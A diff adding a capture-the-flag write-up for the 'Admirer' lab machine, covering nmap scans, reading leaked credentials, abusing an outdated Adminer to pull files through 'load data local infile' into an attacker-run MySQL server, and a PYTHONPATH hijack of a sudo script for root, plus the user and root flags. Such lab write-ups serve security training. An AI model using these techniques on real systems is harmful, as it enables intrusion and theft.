@@ -1,0 +1,78 @@
+* Admirer
+** Enumeration
+*** meta
+# Nmap 7.80 scan initiated Thu May  7 01:53:25 2020 as: nmap -Pn -sC -sV -oA nmap 10.10.10.187
+Nmap scan report for 10.10.10.187
+Host is up (0.014s latency).
+Not shown: 997 closed ports
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu May  7 01:53:35 2020 -- 1 IP address (1 host up) scanned in 9.39 seconds
+*** 21/tcp open  ftp     vsftpd 3.0.3
+No anon login allowed.
+*** 22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
+|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
+|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
+*** 80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/admin-dir
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Admirer
+**** dirsearch
+***** [01:59:06] 301 -  313B  - /assets  ->  http://10.10.10.187/assets/
+***** [01:59:14] 301 -  313B  - /images  ->  http://10.10.10.187/images/
+***** [01:59:15] 200 -    6KB - /index.php
+***** [01:59:15] 200 -    6KB - /index.php/login/
+***** [01:59:23] 200 -  138B  - /robots.txt
+**** gobuster
+** Foothold
+The first big thing to note is *robots.txt*, which tries to steer robots clear of the directory ~admin-dir~. Of course, that's a huge flag to us!
+
+*dirbuster* et al don't turn up anything in this directory, but closer examination of robots.txt mentions credentials and contacts... sure enough, ~admin-dir/credentials.txt~ and ~admin-dir/contacts.txt~ are readable and contain what you might expect!
+
+Only of these recovered creds works, the FTP cred, but from FTP we can get a backup of the website and a SQL dump.
+
+No more creds are available there, but we can start to see the structure of what's going on. In particular some of the utility scripts that are there are still up, but not 'db_admin' which has a note inside to remove it in favor of something else.
+
+Checking for mysql front end db management scripts in this directory and we can a hit on ~/utility-scripts/adminer.php~.
+
+The script itself reports that its out of date and a google search reveals there is a huge exploit available: https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool
+
+Setting up a local mysql host (with creds for 'user@10.10.10.187'), and we can connect to it from ~adminer~ and start exfiltrating files into tables, like so:
+
+attack server: ~create table indexphp (line text);~
+adminer: ~load data local infile '../index.php' into table indexphp;~
+attack server: ~select * from index.php;~
+
+... and so on for other files on disk. The most notable thing available is a new set of credentials for ~waldo~ in ~index.php~ for connecting to the database. After exfiltrating files we can connect with ~adminer~ to localhost, although there doesn't appear to be much of interest.
+
+~ssh waldo@$TARGET~ works with those same credentials though, so we have a foothold and user.txt.
+
+USER: 9257d14047c96d3bfdb3a90b4149b377
+** Escalation
+
+#+BEGIN_SRC bash
+waldo@admirer:~$ sudo -l
+[sudo] password for waldo:
+Matching Defaults entries for waldo on
+admirer:
+env_reset, env_file=/etc/sudoenv,
+mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+listpw=always
+
+User waldo may run the following commands
+on admirer:
+(ALL) SETENV: /opt/scripts/admin_tasks.sh
+#+END_SRC
+
+So the one obvious thing we can is run that script as sudo, which can do a few things... it copies ~/etc/passwd~ and ~/etc/shadow~ and then ~chmod~s, is it possible there's a weird timing attack?
+
+Otherwise, one of the options runs a python script that import a library, so manipulating ~PYTHONPATH~ we may be able to gain RCE by injecting our own library instead.
+
+~sudo -E /opt/scripts/admin_tasks.sh~ doesn't quite work even when ~PYTHONPATH~ is exported into the current environment, but:
+
+~sudo PYTHONPATH=<path-with-shutil> /opt/scripts/admin_tasks.sh~ does!
+ROOT: aa05eb78daf302e1de001d4723faeb94
